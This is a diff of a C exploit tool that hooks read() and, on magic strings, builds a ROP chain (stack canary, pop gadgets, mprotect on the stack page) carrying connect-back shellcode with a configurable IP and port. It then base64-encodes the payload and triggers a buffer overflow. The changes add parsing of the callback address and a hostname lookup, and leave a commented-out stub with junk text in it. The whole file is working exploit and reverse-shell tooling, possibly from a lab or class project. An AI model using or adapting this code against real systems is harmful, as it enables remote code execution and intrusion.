@@ -1,11 +1,13 @@
 #define _GNU_SOURCE
-#include <arpa/inet.h>
 #include <assert.h>
 #include <dlfcn.h>
 #include <stddef.h>
 #include <stdio.h>
 #include <string.h>
 #include <unistd.h>
+
+#include <arpa/inet.h>
+#include <netdb.h> // gethostbyname()
 
 static char encodingTable[] = {
 	'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
@@ -113,10 +115,14 @@ typedef union AddressUnion {
 	char	c[8];
 } AddressUnion, *AddressUnionPtr;
 
+typedef struct IPAdress {
+	unsigned char a, b, c, d;
+} IPAddress, *IPAddressPtr;
+
 typedef struct ShellCode {
 	unsigned char	prolog[18];
 	unsigned short	port;
-	unsigned char	address[4];
+	IPAddress	ipAddress;
 	unsigned char	epilog[50];
 } ShellCode, *ShellCodePtr;
 
@@ -280,6 +286,29 @@ static AddressUnion fixupAddressUnion(AddressUnion au) {
 	return (AddressUnion) { .p = (Pointer) (unsigned long) au.o.r };
 } // fixupAddressUnion()
 
+static int lookupHostName(char *hostName , char *ip)
+{
+    struct hostent *he;
+    struct in_addr **addr_list;
+    int i;
+         
+    if ((he = gethostbyname(hostName)) == NULL) 
+    {
+        herror("gethostbyname");
+        return 1;
+    }
+ 
+    addr_list = (struct in_addr **) he->h_addr_list;
+     
+    for(i = 0; addr_list[i] != NULL; i++) 
+    {
+        strcpy(ip , inet_ntoa(*addr_list[i]) );
+        return 0;
+    }
+     
+    return 1;
+}
+
 static void makeload(PayloadPtr plp) {
 	printf("In makeload()\n");
 
@@ -303,10 +332,11 @@ static void makeload(PayloadPtr plp) {
 	plp->pl_shellCode.o	= pointerToOffset(&plp->pl_scu, 'B');
 
 	plp->pl_scu.sc.port       = htons(5555);
-	plp->pl_scu.sc.address[0] = 10;
-	plp->pl_scu.sc.address[1] = 0;
-	plp->pl_scu.sc.address[2] = 1;
-	plp->pl_scu.sc.address[3] = 24;
+	plp->pl_scu.sc.ipAddress = (IPAddress) {127, 0, 0, 1};
+	//plp->pl_scu.sc.address[0] = 127;
+	//plp->pl_scu.sc.address[1] = 0;
+	//plp->pl_scu.sc.address[2] = 0;
+	//plp->pl_scu.sc.address[3] = 1;
 
 	// This construct keeps the compiler from removing what it thinks is dead code in gadgets that follow:
 	int volatile v = 0;
@@ -339,18 +369,21 @@ static void dumpload(PayloadPtr plp) {
 	printf("In dumpload()\n");
 
 	printf("--------------------------------------------\n");
-	printf("%20s: %p\n",           "pl_canary.p",       plp->pl_canary.p);
-	printf("%20s: %p\n",           "pl_rbp.p",          plp->pl_rbp.p);
-	printf("%20s: %p\n",           "pl_popRDI.p",       plp->pl_popRDI.p);
-	printf("%20s: %p\n",           "pl_stackPage.p",    plp->pl_stackPage.p);
-	printf("%20s: %p\n",           "pl_popRSI.p",       plp->pl_popRSI.p);
-	printf("%20s: %#tx\n",         "pl_stackSize",      plp->pl_stackSize);
-	printf("%20s: %p\n",           "pl_popRDX.p",       plp->pl_popRDX.p);
-	printf("%20s: %#tx\n",         "pl_permission",     plp->pl_permission);
-	printf("%20s: %p\n",           "pl_mprotect.p",     plp->pl_mprotect.p);
-	printf("%20s: %p\n",           "pl_shellCode.p",    plp->pl_shellCode.p);
-	printf("%20s: %d\n",           "pl_scu.sc.port",    ntohs(plp->pl_scu.sc.port));
-	printf("%20s: %d.%d.%d.%d\n",  "pl_scu.sc.address", plp->pl_scu.sc.address[0], plp->pl_scu.sc.address[1], plp->pl_scu.sc.address[2], plp->pl_scu.sc.address[3]);
+	printf("%20s: %p\n",			"pl_canary.p",		plp->pl_canary.p);
+	printf("%20s: %p\n",			"pl_rbp.p",		plp->pl_rbp.p);
+	printf("%20s: %p\n",			"pl_popRDI.p",		plp->pl_popRDI.p);
+	printf("%20s: %p\n",			"pl_stackPage.p",	plp->pl_stackPage.p);
+	printf("%20s: %p\n",			"pl_popRSI.p",		plp->pl_popRSI.p);
+	printf("%20s: %#tx\n",			"pl_stackSize",		plp->pl_stackSize);
+	printf("%20s: %p\n",			"pl_popRDX.p",		plp->pl_popRDX.p);
+	printf("%20s: %#tx\n",			"pl_permission",	plp->pl_permission);
+	printf("%20s: %p\n",			"pl_mprotect.p",	plp->pl_mprotect.p);
+	printf("%20s: %p\n",			"pl_shellCode.p",	plp->pl_shellCode.p);
+	printf("%20s: %d\n",			"pl_scu.sc.port",	ntohs(plp->pl_scu.sc.port));
+	printf("%20s: %hhu.%hhu.%hhu.%hhu\n",	"pl_scu.sc.ipAddress",	plp->pl_scu.sc.ipAddress.a,
+									plp->pl_scu.sc.ipAddress.b,
+									plp->pl_scu.sc.ipAddress.c,
+									plp->pl_scu.sc.ipAddress.d);
 	printf("--------------------------------------------\n");
 } // dumpload()
 
@@ -399,32 +432,43 @@ ssize_t read(int fd, void *buf, size_t count) {
 	{
 		p += strlen(s_magic);
 		if (!strncmp(s_makeload, p, strlen(s_makeload))) {
+			p += strlen(s_makeload);
 			makeload(&payload);
 dumpload(&payload);
-			// Temporary kludge for setting IP address
-			unsigned char a, b, c, d;
-			int num_chars;
-			if (sscanf(p + strlen(s_makeload), "%hhu.%hhu.%hhu.%hhu%n", &a, &b, &c, &d, &num_chars) == 4) {
-				payload.pl_scu.sc.address[0] = a;
-				payload.pl_scu.sc.address[1] = b;
-				payload.pl_scu.sc.address[2] = c;
-				payload.pl_scu.sc.address[3] = d;
+			// Take the IP address from after the word "MAKELOAD" (if it's there)
+			int nc;
+			IPAddress ip;
+			unsigned short port;
+			int ns = sscanf(p, "%hhu.%hhu.%hhu.%hhu%n:%hu%n", &ip.a, &ip.b, &ip.c, &ip.d, &nc, &port, &nc);
+printf("RES: ns: %d, nc: %d\n", ns, nc);
+			if (ns >= 4) {
+				assert(ns <= 5);
+				payload.pl_scu.sc.ipAddress = ip;
+				if (ns > 4)
+					payload.pl_scu.sc.port = htons(port);
 			} else {
+/*
+				ns = sscanf(p, "%[^:]%n:%hun%n", hostName, &nc, &port, &nc);
+				if (ns >= 1) {
+					assert(ns <= 2);
+					payload asdf asdf asdf sdf 
+					if (ns > 1)
+						payload.pl_scu.sc.port = htons(port);
+				}
+*/
 				printf("Bad IP. Using 127.0.0.1\n");
-				a = 127; b = 0; c = 0; d = 1;
-				num_chars = 0;
+				nc = 0;
 			} // else
 
 dumpload(&payload);
 			size_t payload64Size;
 			char *payload64 = base64Encode((const unsigned char *) &payload, sizeof(payload), &payload64Size);
-printf("payload64Size: %td\n", payload64Size);
-			char *src = p + strlen(s_makeload) + num_chars;
-			char *dst = p - strlen(s_magic) + payload64Size;
-			int need = strlen(s_magic) - strlen(s_makeload) - num_chars + payload64Size;
+			char *src = p + nc;
+			char *dst = p - strlen(s_magic) - strlen(s_makeload) + payload64Size;
+			int need = strlen(s_magic) - strlen(s_makeload) - nc + payload64Size;
 			int tail = result - (src - ((char *) buf));
 			memmove(dst, src, tail);
-			memcpy(((char *) p) - strlen(s_magic), payload64, payload64Size);
+			memcpy(((char *) p) - strlen(s_magic) - strlen(s_makeload), payload64, payload64Size);
 			result += need;
 			((char *) buf)[result] = 0;
 		} // if
@@ -442,7 +486,6 @@ printf("payload64Size: %td\n", payload64Size);
 			base64Decode(p, p + strlen(s_overflow));
 dumpload((PayloadPtr) p);
 			fillload(((PayloadPtr) p), sizeof(Payload));
-dumpload((PayloadPtr) p);
 			overflow(p, sizeof(Payload));
 
 		} // else if
